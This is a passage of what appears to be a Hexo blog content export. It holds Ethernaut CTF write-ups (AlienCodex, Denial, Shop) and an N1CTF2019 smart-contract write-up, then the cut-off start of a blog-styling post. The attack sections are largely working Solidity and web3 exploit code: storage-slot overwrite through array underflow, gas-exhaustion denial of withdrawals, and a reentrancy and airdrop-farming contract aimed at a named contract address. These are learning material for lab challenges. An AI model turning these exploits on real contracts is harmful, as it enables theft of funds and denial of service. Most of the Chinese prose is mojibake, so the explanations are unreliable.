Âõ†‰∏∫ÊÄªÂÖ±Êúâ 2^256 ‰∏™ slot ÔºåË¶Å‰øÆÊîπ slot 0 ÔºåÂÅáËÆæ codex ÂÆûÈôÖÊâÄÂú® slot x Ôºå(ÂØπ‰∫éÊú¨È¢òÊù•ËØ¥ÔºåÊï∞ÁªÑÁöÑ slotÊòØ 1 , x=keccak256(bytes32(1))) ÔºåÈÇ£‰πàÂΩìÊàë‰ª¨‰øÆÊîπ codex[y],(y=2^256-x+0) Êó∂Â∞±ËÉΩ‰øÆÊîπ slot 0 Ôºå‰ªéËÄå‰øÆÊîπ owner Êàë‰ª¨Ë¶Å‰øÆÊîπ codex[y] ÔºåÈÇ£Â∞±Ë¶ÅÊª°Ë∂≥ y &lt; codex.length ÔºåËÄåËøô‰∏™Êó∂ÂÄô codex.length =0 Ôºå‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá retract() ‰Ωø length ‰∏ãÊ∫¢ÔºåÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ÊìçÁ∫µ codex[y] ‰∫Ü 123await web3.eth.getStorageAt(instance, 1, function(x, y) &#123;console.info(y)&#125;);// codex.length// 0x0000000000000000000000000000000000000000000000000000000000000000 ‰ΩÜÊòØÊó†ËÆ∫Ë∞ÉÁî®È¢òÁõÆÂêàÁ∫¶Âì™‰∏™ÂáΩÊï∞ÔºåÈÉΩË¶ÅÊª°Ë∂≥ modifier contacted() ÔºåÊâÄ‰ª•Ë¶ÅÂÖà‰Ωø contact=true Ôºå‰πüÂ∞±ÊòØË¶ÅÂÖàËß£ÂÜ≥ make_contact Ëøô‰∏™ÈóÆÈ¢ò Solution1„ÄÅÂÖàÁúã make_contact ÂáΩÊï∞ÔºåÊàë‰ª¨ÈúÄË¶Å‰º†‰∫∫‰∏Ä‰∏™ length&gt;2^200 ÁöÑÊï∞ÁªÑÔºåOPCODE ‰∏≠Êï∞ÁªÑÈïøÂ∫¶ÊòØÂ≠òÂÇ®Âú®Êüê‰∏™ slot ‰∏äÁöÑÔºåÂπ∂‰∏îÊ≤°ÊúâÂØπÊï∞ÁªÑÈïøÂ∫¶ÂíåÊï∞ÁªÑÂÜÖÁöÑÊï∞ÊçÆÂÅöÊ†°È™åÔºåÊâÄ‰ª•ÂèØ‰ª•ÊûÑÈÄ†‰∏Ä‰∏™Â≠òÂÇ®‰Ωç‰∏äÈïøÂ∫¶ÂæàÂ§ßÔºå‰ΩÜÂÆûÈôÖ‰∏äÂπ∂Ê≤°ÊúâÊï∞ÊçÆÁöÑÊï∞ÁªÑÔºåÊâìÂåÖÊàê data ÂèëÈÄÅ123456789101112sig = web3.sha3("make_contact(bytes32[])").slice(0,10) // ÂáΩÊï∞id// "0x1d3d4c0b"data1 = "0000000000000000000000000000000000000000000000000000000000000020" //ÂÅèÁßªÔºåÊåáÁöÑÊòØÈô§‰∫ÜÂáΩÊï∞idÔºåÊï∞ÁªÑÂÜÖÂÆπÂºÄÂßãÁöÑ‰ΩçÁΩÆÔºåÂú®ËøôÈáåÊàë‰ª¨ËÆæÁΩÆÁöÑÊòØoffset=32// Èô§ÂéªÂáΩÊï∞ÈÄâÊã©Âô®ÔºåÊï∞ÁªÑÈïøÂ∫¶ÁöÑÂ≠òÂÇ®‰ªéÁ¨¨ 0x20 ‰ΩçÂºÄÂßãdata2 = "1000000000000000000000000000000000000000000000000000000000000001" //length&gt;2^200// Êï∞ÁªÑÁöÑÈïøÂ∫¶await contract.contact()// falsecontract.sendTransaction(&#123;data: sig + data1 + data2&#125;);// ÂèëÈÄÅ‰∫§Êòìawait contract.contact()// true 2„ÄÅËÆ°ÁÆó codex ‰ΩçÁΩÆ‰∏∫ slot 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 ÊâÄ‰ª• y = 2^256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0 Âç≥ y = 35707666377435648211887908874984608119992236509074197713628505308453184860938 123456789pragma solidity ^0.4.24;contract codex &#123; function cal() view returns(bytes32)&#123; return keccak256((bytes32(1))); &#125; &#125; 3„ÄÅÂèØ‰ª•ÁúãÂà∞ y = 35707666377435648211887908874984608119992236509074197713628505308453184860938 ÂæàÂ§ßÔºåËÄå codex.length=0(ËßÅAnalyse) ÂæàÂ∞èÔºåÊàë‰ª¨ÈÄöËøá retract() ‰ΩøÂæó codex Êï∞ÁªÑ length ‰∏ãÊ∫¢Ôºå‰ΩøÂÖ∂Êª°Ë∂≥ y &lt; codex.length12345678web3.eth.getStorageAt(instance, 1, function(x, y) &#123;console.info(y)&#125;); // codex.length// 0x0000000000000000000000000000000000000000000000000000000000000000contract.retract()// codex.length--web3.eth.getStorageAt(instance, 1, function(x, y) &#123;console.info(y)&#125;); // codex.length// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 4„ÄÅÁî±2Âíå3Â∑≤ÁªèËÆ°ÁÆóÂá∫ codex[35707666377435648211887908874984608119992236509074197713628505308453184860938] ÂØπÂ∫îÁöÑÂ≠òÂÇ®‰ΩçÂ∞±ÊòØ slot 0 ÔºåÂú® Analyse ‰∏≠ÊèêÂà∞ slot 0 ‰∏≠ÂêåÊó∂Â≠òÂÇ®‰∫Ü contact Âíå owner ÔºåÊàë‰ª¨Âè™ÈúÄÂ∞Ü owner Êç¢Êàê player Âú∞ÂùÄÂç≥ÂèØ123456789await contract.owner()// "0x73048cec9010e92c298b016966bde1cc47299df5"player// "0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2"contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x00000000000000000000000088d3052d12527f1fbe3a6e1444ea72c4ddb396c2')// Ë∞ÉÁî® revise()await contract.owner()// "0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2"// Submit instance DenialRequire This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner. If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds) you will win this level. ÁªìÂêà‰ª£Á†ÅÁúã‰∫Ü‰∏Ä‰∏ãÔºåË¶ÅÊ±ÇÂ∞±ÊòØÂú®Ë∞ÉÁî® withdraw Êó∂ÔºåÁ¶ÅÊ≠¢ owner ËΩ¨Ëµ∞Ë¥¶Êà∑ÁöÑ 1% ÁöÑ‰ΩôÈ¢ù Source123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.24;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Denial &#123; using SafeMath for uint256; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = 0xA9E; uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance.div(100); // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call.value(amountToSend)(); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend); &#125; // allow deposit of funds function() payable &#123;&#125; // convenience function function contractBalance() view returns (uint) &#123; return address(this).balance; &#125;&#125; Analyse ÂèØ‰ª•‰Ωø transfer Â§±Ë¥•Ôºå‰πüÂ∞±ÊòØÊää gas ËÄóÂÖâ ‰ΩøÁî® assert Â§±Ë¥•ÁöÑËØùÔºåÂ∞Ü‰ºö spend all gas ÔºåËøôÊ†∑ÁöÑËØù owner.transfer(amountToSend) Â∞ÜÊâßË°åÂ§±Ë¥• ËøôÈáåËøòÊúâ‰∏Ä‰∏™ÂæàÊòéÊòæÁöÑÈáçÂÖ•ÊºèÊ¥û partner.call.value(amountToSend)() ÔºåÂà©Áî®ÈáçÂÖ•ÊºèÊ¥ûÊää gas Ê∂àËÄóÂÆåÔºåÂ∫îËØ•‰πüÂèØ‰ª•ËææÂà∞ÁõÆÁöÑÔºàËá™Ë°åÂ∞ùËØïÔºâ Solution1234567891011121314151617181920212223242526272829303132333435363738394041424344454647pragma solidity ^0.4.24;contract Denial &#123; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = 0xA9E; uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance/100; // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call.value(amountToSend)(); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] += amountToSend; &#125; // allow deposit of funds function() payable &#123;&#125; // convenience function function contractBalance() view returns (uint) &#123; return address(this).balance; &#125;&#125;contract hack &#123; address instance_address = 0xe6cdb72d9fec660b78eb2390ffa67ab61b766e51; Denial target = Denial(instance_address); function hack1() public &#123; target.setWithdrawPartner(address(this)); target.withdraw(); &#125; function() payable &#123; assert(0==1); &#125;&#125; Áõ¥Êé•Ë∞ÉÁî® hack1() Âç≥ÂèØ ShopRequire È¢òÁõÆÊÑèÊÄùÊòØ‰øÆÊîπ price Â∞è‰∫é 100 Ôºà‰∏çËøáËøô‰∏™È¢òÁõÆÂ•ΩÂÉè‰∏ãÁ∫ø‰∫Ü23333Ôºâ Source12345678910111213141516171819pragma solidity 0.4.24;interface Buyer &#123; function price() external view returns (uint);&#125;contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price.gas(3000)(); &#125; &#125;&#125; Analyse Êú¨Êù•ÊÉ≥ÁöÑÊòØÂà©Áî® storage ‰øÆÊîπÔºåÂèØÊòØ‰øÆÊîπÂèòÈáèÈúÄË¶Å 5000 gasÔºå‰ΩÜÊòØÊàë‰ª¨Âè™Êúâ 3000 ÊâÄ‰ª•ÈúÄË¶ÅÂè¶ÊÉ≥ÂäûÊ≥ïÔºåÂèëÁé∞ isSold ÊòØ public Â±ûÊÄßÔºåÊâÄ‰ª•ÂèØ‰ª•Âà©Áî® isSold ÔºåÊ†πÊçÆ isSold ËøõË°åÂà§Êñ≠Ôºå‰∏§Ê¨°Ë∞ÉÁî® _buyer.price.gas(3000)() Á¨¨‰∏ÄÊ¨°ËøîÂõûÂ§ß‰∫éÁ≠â‰∫é 100 ÔºåÁ¨¨‰∫åÊ¨°ËøîÂõûÂ∞è‰∫é 100 Âç≥ÂèØ Solution12345678910111213141516171819202122232425262728pragma solidity 0.4.24;contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price.gas(3000)(); &#125; &#125;&#125;contract Buyer &#123; address instance_address = instance_address_here; Shop target = Shop(instance_address); function price() external view returns (uint)&#123; return Shop(msg.sender).isSold() == true ? 99 : 100; &#125; function attack() public &#123; target.buy(); &#125;&#125; Áõ¥Êé•Ë∞ÉÁî® attack() Âç≥ÂèØ Referencehttp://mitah.cn/index.php/archives/14/https://f3real.github.io/Ethernaut_wargame2022.html#lvl-21-denialhttps://www.codercto.com/a/38161.htmlhttps://www.secpulse.com/archives/73682.htmlhttps://www.anquanke.com/post/id/148341#h2-12https://xz.aliyun.com/t/2856#toc-4https://blog.riskivy.com/Êô∫ËÉΩÂêàÁ∫¶ctfÔºöethernaut-writeup-part-4/https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Smart Contract</tag>
        <tag>Ethernaut</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[N1CTF2019 h4ck]]></title>
    <url>%2F2019%2Fh4ck%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂâçÊÆµÊó∂Èó¥ÂèÇÂä†‰∫Ü‰∏Ä‰∏ãN1CTF2019Ôºà‰Ωú‰∏∫Â∞èÁôΩÂèÇÂä†ÔºâÔºåÂæàÂπ∏ËøêÂÅöÂá∫‰∏ÄÈÅìSmart ContractÁöÑÈ¢òÁõÆÔºåÂú®Ê≠§ËÆ∞ÂΩï‰∏Ä‰∏ãÔºåÂêàÁ∫¶Âú∞ÂùÄÂ¶Ç‰∏ãÔºöhttps://kovan.etherscan.io/address/0xe2d6d8808087d2e30eadf0acb67708148dbee0c0 Contract Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142/** *Submitted for verification at Etherscan.io on 2019-09-07*//** *Submitted for verification at Etherscan.io on 2019-05-31*/pragma solidity ^0.4.25;contract owned &#123; address public owner; constructor () public &#123; owner = msg.sender; &#125; modifier onlyOwner &#123; require(msg.sender == owner); _; &#125; function transferOwnership(address newOwner) public onlyOwner &#123; owner = newOwner; &#125;&#125;contract challenge is owned&#123; string public name; string public symbol; uint8 public decimals = 18; uint256 public totalSupply; mapping (address =&gt; uint256) public balanceOf; mapping (address =&gt; uint256) public sellTimes; mapping (address =&gt; mapping (address =&gt; uint256)) public allowance; mapping (address =&gt; bool) public winner; event Transfer(address _from, address _to, uint256 _value); event Burn(address _from, uint256 _value); event Win(address _address,bool _win); constructor ( uint256 initialSupply, string tokenName, string tokenSymbol ) public &#123; totalSupply = initialSupply * 10 ** uint256(decimals); balanceOf[msg.sender] = totalSupply; name = tokenName; symbol = tokenSymbol; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); emit Transfer(_from, _to, _value); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) &#123; require(_value &lt;= allowance[_from][msg.sender]); allowance[_from][msg.sender] -= _value; _transfer(_from, _to, _value); return true; &#125; function approve(address _spender, uint256 _value) public returns (bool success) &#123; allowance[msg.sender][_spender] = _value; return true; &#125; function burn(uint256 _value) public returns (bool success) &#123; require(balanceOf[msg.sender] &gt;= _value); balanceOf[msg.sender] -= _value; totalSupply -= _value; emit Burn(msg.sender, _value); return true; &#125; function balanceOf(address _address) public view returns (uint256 balance) &#123; return balanceOf[_address]; &#125; function buy() payable public returns (bool success)&#123; require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); _transfer(address(this), msg.sender, 1); sellTimes[msg.sender] = 1; return true; &#125; function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 100); require(sellTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); sellTimes[msg.sender] -= 1; return true; &#125; function winnerSubmit() public returns (bool success)&#123; require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); winner[msg.sender] = true; emit Win(msg.sender,true); return true; &#125; function kill(address _address) public onlyOwner &#123; selfdestruct(_address); &#125; function eth_balance() public view returns (uint256 ethBalance)&#123; return address(this).balance; &#125; &#125; ÂàÜÊûê È¢òÁõÆÁöÑË¶ÅÊ±ÇÊòØexecute the winnerSubmit function 1234567function winnerSubmit() public returns (bool success)&#123; require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); winner[msg.sender] = true; emit Win(msg.sender,true); return true;&#125; ËøôÈáåÊúâ‰∏§‰∏™requireÔºåÂÖ∂‰∏≠Á¨¨‰∏Ä‰∏™requireÂæàÂÆπÊòìÊª°Ë∂≥ÔºåÂàõÂª∫winnerÁöÑÊó∂ÂÄôÈªòËÆ§ÂÖ®‰∏∫falseÔºåÊâÄ‰ª•Âè™Ë¶ÅÊª°Ë∂≥Á¨¨‰∫å‰∏™requireÂç≥ÂèØ require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); ÈòÖËØªÂêàÁ∫¶‰ª£Á†ÅÔºåÂèëÁé∞sellÂáΩÊï∞ÔºåËøôÈáåÁöÑmsg.sender.call.value(_amount)()Â≠òÂú®ReentrancyÊºèÊ¥û,ÂêåÊó∂ÂèØ‰ª•‰ΩøÂæósellTimes[msg.sender] -= 1,Â¶ÇÊûúËÉΩ‰∫ßÁîü‰∏ãÊ∫¢Â∞±Ë°å‰∫ÜÔºåÊâÄ‰ª•ÈúÄË¶ÅÊâæ‰∏Ä‰∏ãÂàùÂßãÂåñsellTimes[msg.sender]ÁöÑÂú∞ÊñπÔºå‰ΩÜÊòØËøôÈáåÊúâ4‰∏™requireÔºö Á¨¨‰∏Ä‰∏™requireÂæàÂÆπÊòìÊª°Ë∂≥ Á¨¨‰∫å‰∏™requireÂèØ‰ª•Áúã‰∏ãÈù¢ÁöÑbuyÂáΩÊï∞ÂàÜÊûê Á¨¨‰∏â‰∏™requireÂèØ‰ª•‰ΩøÁî®ËñÖÁæäÊØõÊîªÂáªÊñπÊ≥ïÔºå‰ΩøÂæóbalanceOf[msg.sender]ËææÂà∞ÊåáÂÆöÊï∞È¢ù Á¨¨Âõõ‰∏™requireËá™Âä®Êª°Ë∂≥Ôºåaddress(this).balanceÁªôÁöÑÂæàÂ§ß12345678910function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 100); require(sellTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); sellTimes[msg.sender] -= 1; return true;&#125; ÊâæÂà∞‰∫ÜbuyÂáΩÊï∞ÔºåÂèØ‰ª•‰ΩøÂæósellTimes[msg.sender] = 1ÔºåËøôÈáåÊúâ‰∏§‰∏™requireÔºåÁ¨¨‰∏Ä‰∏™ÂæàÂÆπÊòìÊª°Ë∂≥ÔºåÈªòËÆ§Â∞±ÊòØ0ÔºåÊâÄ‰ª•Âè™Ë¶Åmsg.value == 1 weiÂç≥ÂèØÔºåËøôÊ†∑ÁöÑËØùbuyÂáΩÊï∞Â∞±ÂèØ‰ª•ÊîπÂèòsellTimes[msg.sender]‰∏∫1‰∫Ü 1234567function buy() payable public returns (bool success)&#123; require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); _transfer(address(this), msg.sender, 1); sellTimes[msg.sender] = 1; return true;&#125; ËøôÊ†∑ÁöÑËØùÔºåÂ¶ÇÊûúÂà©Áî®buyÂáΩÊï∞ÂÖà‰ΩøÂæósellTimes[msg.sender]=1ÔºåÁÑ∂ÂêéË∞ÉÁî®sellÂáΩÊï∞Âà©Áî®ReentrancyÊºèÊ¥ûÈáçÂÖ•ÊîªÂáª‰∏§Ê¨°ÁöÑËØùÔºåsellTimes[msg.sender]ÊòØuint256Á±ªÂûãÔºåËøûÁª≠‰∏§Ê¨°Âáè1ÂèØ‰ª•‰∏ãÊ∫¢ÔºåËøúËøúÂ§ß‰∫é100Ôºå‰æøÂèØÊª°Ë∂≥winnerSubmit‰∏≠ÁöÑÁ¨¨‰∫å‰∏™requireÔºåÊîªÂáªÊàêÂäü ÈÉ®ÁΩ≤ÊîªÂáªÂêàÁ∫¶ÊîªÂáªÂêàÁ∫¶‰ª£Á†ÅËøôÈáåÈÉ®ÁΩ≤‰∫Ü‰∏§‰∏™ÂêàÁ∫¶Ôºà‰∏çË¶ÅÂú®ÊÑèÂëΩÂêç‰∫Ü23333ÔºâÔºåhackerÊòØÊîªÂáªÂêàÁ∫¶Ôºåhacker1ÊòØËæÖÂä©ÂêàÁ∫¶ÔºåÁî®Êù•ÂÆåÊàêËñÖÁæäÊØõËΩ¨Ë¥¶Áî®Âà∞ÁöÑÔºå Ê≥®ÊÑèÂú®ÈÉ®ÁΩ≤hackerÁöÑÂêåÊó∂ËΩ¨Ë¥¶1 weiÔºåÁõÆÁöÑÊòØË∞ÉÁî®ÂêéÈù¢ÁöÑbuyÂáΩÊï∞ ÈÉ®ÁΩ≤hacker1ÁöÑÂêåÊó∂ËΩ¨Ë¥¶200 weiÔºåÁõÆÁöÑÊòØÂÆåÊàêÂêéÈù¢ËñÖÁæäÊØõËΩ¨Ë¥¶ÔºåËã•amount=100 weiÔºåÂàôÂèØ‰ª•ReentrancyÊîªÂáª‰∏§Ê¨°ÔºåÂÆåÊàêÊîªÂáª1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253contract hacker &#123; address instance_address = 0xe2d6d8808087d2e30eadf0acb67708148dbee0c0; challenge target = challenge(instance_address); function hacker() payable &#123;&#125; function hack1()&#123; target.buy.value(1)(); &#125; function hack4()&#123; target.sell(uint(100)); &#125; function get() public view returns (uint256 balance) &#123; return address(this).balance; &#125; function hack5()&#123; target.winnerSubmit(); &#125; function() public payable &#123; target.sell(uint(100)); &#125; &#125;contract hacker1 &#123; address instance_address = 0xe2d6d8808087d2e30eadf0acb67708148dbee0c0; challenge target = challenge(instance_address); function hacker1() payable &#123;&#125; function hack1()&#123; target.buy.value(1)(); &#125; function hack2()&#123; target.transfer(address(0x5ebec5286e74362613a5e6e8e3bb90df408fe2a7), 1); &#125; function hack3()&#123; for(uint i = 0; i&lt;100; i++)&#123; hack1(); hack2(); &#125; &#125; function get() public view returns (uint256 balance) &#123; return address(this).balance; &#125;&#125; Ë∞ÉÁî®Ê≠•È™§ÊîªÂáªÂêàÁ∫¶Âú∞ÂùÄ0x48e3c62a006758d26b3ded0f4e28317fe0ea9dc8ËñÖÁæäÊØõËæÖÂä©ÂêàÁ∫¶Âú∞ÂùÄ0x334e9e1c289be32000182e549fbadf27589b436e Ë∞ÉÁî®hackerÁöÑhack1ÂáΩÊï∞Ôºå‰ΩøÂæósellTimes[address hacker]=1ÔºåbalanceOf[address hacker]=1 wei Ë∞ÉÁî®hacker1ÁöÑhack3ÂáΩÊï∞‰∏§Ê¨°Ôºå‰ΩøÂæóbalanceOf[address hacker]+200=201 Ë∞ÉÁî®hackerÁöÑhack4ÂáΩÊï∞‰∏§Ê¨°ÔºåÊØèÊ¨°amount=100ÔºåËøôÊ†∑‰æø‰ΩøÂæósellTimes[address hacker]ÂÆåÊàê‰∏ãÊ∫¢ÔºåÂèØ‰ª•ÁúãÂà∞sellTimes[address hacker]Â∑≤Áªè‰∏ãÊ∫¢Âà∞‰∏Ä‰∏™ÂæàÂ§ßÁöÑÊï∞ ÊúÄÂêéË∞ÉÁî®hackerÁöÑhack5Ë∞ÉÁî®winnerSubmitÂÆåÊàêÊîªÂáª(‰∏ªÂäûÊñπÊúçÂä°Â∑≤ÂÖ≥Èó≠23333ÊâÄ‰ª•Ê≤°Ê≥ïÁúãÂà∞flagÔºåÂè™ÊúâÂΩìÊó∂Ë¢´ÊêÖÂ±éÊ£çÊêûËøáÁöÑ‰∏ÄÂº†Êà™Âõæ‰∫ÜÔºå‰∏ÄÁõ¥Êãø‰∏çÂà∞flagÔºåÊúÄÂêéÂèëÁé∞flagÂè™ÊúâÂú®ËØ∑Ê±ÇÁöÑÈÇ£‰∏ÄÁû¨Èó¥‰ºöÂá∫Áé∞ËÄå‰∏î‰ªÖÂá∫Áé∞‰∏ÄÊ¨°ÔºåËØ∑ÂéüË∞ÖÊàë‰∏ç‰ºöÂà©Áî®web3Ëá™Âä®ÂåñÊ®°ÊãüÊîªÂáªÔºå‰∏çËøáÊúÄÂêéËøòÊòØËß£ÂÜ≥‰∫ÜÔºåÂÜô‰∫Ü‰∏™ËÑöÊú¨Ôºå‰∏ÄÁõ¥ËØ∑Ê±ÇÂ∞±ÂèØ‰ª•ÔºåÊàêÂäüÊãøÂà∞‰∫ÜflagÔºåËÑöÊú¨Â¶Ç‰∏ã)123456import requestsurl="http://47.244.41.61/challenge?address=0x48e3c62a006758d26b3ded0f4e28317fe0ea9dc8"while True: print requests.get(url).content.split("alert")[1].split("script")[0]]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>Solidity</tag>
        <tag>Smart Contract</tag>
        <tag>N1CTF2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Start My Blog Trip]]></title>
    <url>%2F2019%2FHello-World%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä‰ªãÁªçGrammarÂèäÂÖ∂Style ÂêçË®ÄLife is a generic method like [ public Life doSomething(T t){} ],T is the part of life that requires you to play in a period of time,and the method will return a life you expect if you to be T. ‚Äî‚Äî Ê≤É¬∑ÂÖπÂü∫Á°ïÂæ∑ 1234&#123;% centerquote %&#125;Life is a generic method like [ public &lt;T&gt; Life doSomething(T t)&#123;&#125; ],T is the part of life that requires you to play in a period of time,and the method will return a life you expect if you to be T. ‚Äî‚Äî ***Ê≤É¬∑ÂÖπÂü∫Á°ïÂæ∑***&#123;% endcenterquote %&#125; ‰∏ãËΩΩÂõæÂΩ¢ËæπÊ°Ü Download Now1234&lt;a id=&quot;download&quot; href=&quot;https://git-scm.com/download/win&quot;&gt; &lt;i class=&quot;fa fa-download&quot;&gt;&lt;/i&gt; &lt;span&gt; Download Now&lt;/span&gt;&lt;/a&gt; Âú®ÊñáÊ°£‰∏≠Â¢ûÂä†ÂõæÊ†á ÊîØÊåÅMarkdownHexo ÊîØÊåÅ GitHub Flavored Markdown ÁöÑÊâÄÊúâÂäüËÉΩ, ÁîöËá≥ÂèØ‰ª•Êï¥Âêà Octopress ÁöÑÂ§ßÂ§öÊï∞Êèí‰ª∂. ‰∏ÄÈîÆÈÉ®ÁΩ≤Âè™ÈúÄ‰∏ÄÊù°Êåá‰ª§Âç≥ÂèØÈÉ®ÁΩ≤Âà∞Github Pages, ÊàñÂÖ∂‰ªñÁΩëÁ´ô ‰∏∞ÂØåÁöÑÊèí‰ª∂Hexo Êã•ÊúâÂº∫Â§ßÁöÑÊèí‰ª∂Á≥ªÁªü, ÂÆâË£ÖÊèí‰ª∂ÂèØ‰ª•ËÆ© Hexo ÊîØÊåÅ Jade, CoffeeScript. 123456- &lt;i class=&quot;fa fa-pencil&quot;&gt;&lt;/i&gt;ÊîØÊåÅMarkdown&lt;i&gt;Hexo ÊîØÊåÅ GitHub Flavored Markdown ÁöÑÊâÄÊúâÂäüËÉΩ, ÁîöËá≥ÂèØ‰ª•Êï¥Âêà Octopress ÁöÑÂ§ßÂ§öÊï∞Êèí‰ª∂. &lt;/i&gt;- &lt;i class=&quot;fa fa-cloud-upload&quot;&gt;&lt;/i&gt;‰∏ÄÈîÆÈÉ®ÁΩ≤&lt;i&gt;Âè™ÈúÄ‰∏ÄÊù°Êåá‰ª§Âç≥ÂèØÈÉ®ÁΩ≤Âà∞Github Pages, ÊàñÂÖ∂‰ªñÁΩëÁ´ô&lt;/i&gt;- &lt;i class=&quot;fa fa-cog&quot;&gt;&lt;/i&gt;‰∏∞ÂØåÁöÑÊèí‰ª∂&lt;i&gt;Hexo Êã•ÊúâÂº∫Â§ßÁöÑÊèí‰ª∂Á≥ªÁªü, ÂÆâË£ÖÊèí‰ª∂ÂèØ‰ª•ËÆ© Hexo ÊîØÊåÅ Jade, CoffeeScript. &lt;/i&gt; &lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;1&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;`&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;` &lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt;1&lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt;`&lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt;` &lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt;1&lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt;`&lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt;` ÊñáÂ≠óÂ¢ûÂä†ËÉåÊôØËâ≤ÂùóÁ´ôÁÇπÈÖçÁΩÆÊñá‰ª∂ , ‰∏ªÈ¢òÈÖçÁΩÆÊñá‰ª∂1234&lt;span id=&quot;inline-blue&quot;&gt;Á´ôÁÇπÈÖçÁΩÆÊñá‰ª∂&lt;/span&gt;,&lt;span id=&quot;inline-purple&quot;&gt;‰∏ªÈ¢òÈÖçÁΩÆÊñá‰ª∂&lt;/span&gt;&lt;span id=&quot;inline-green&quot;&gt;Á´ôÁÇπÈÖçÁΩÆÊñá‰ª∂&lt;/span&gt;,&lt;span id=&quot;inline-yellow&quot;&gt;‰∏ªÈ¢òÈÖçÁΩÆÊñá‰ª∂&lt;/span&gt; ÂºïÁî®ËæπÊ°ÜÂèòËâ≤ÊàëË¶ÅÂèòËâ≤ÊàëË¶ÅÂèòËâ≤ÊàëË¶ÅÂèòËâ≤ÊàëË¶ÅÂèòËâ≤ 123456789101112131415&lt;p id=&quot;div-border-top-red&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-top-yellow&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p id=&quot;div-border-top-green&quot;&gt;ÊàëË¶ÅÂèòËâ≤&lt;/p&gt;&lt;p 